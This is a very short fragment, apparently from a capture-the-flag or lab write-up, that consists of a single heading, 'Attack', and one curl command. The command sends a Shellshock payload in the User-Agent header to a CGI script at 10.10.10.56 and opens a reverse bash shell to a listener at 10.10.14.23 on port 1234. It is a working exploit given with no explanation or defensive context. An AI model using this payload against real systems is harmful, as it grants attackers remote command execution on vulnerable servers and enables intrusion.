## Attack
`curl -A "() { :;}; /bin/bash -i >& /dev/tcp/10.10.14.23/1234 0>&1" http://10.10.10.56/cgi-bin/user.sh`
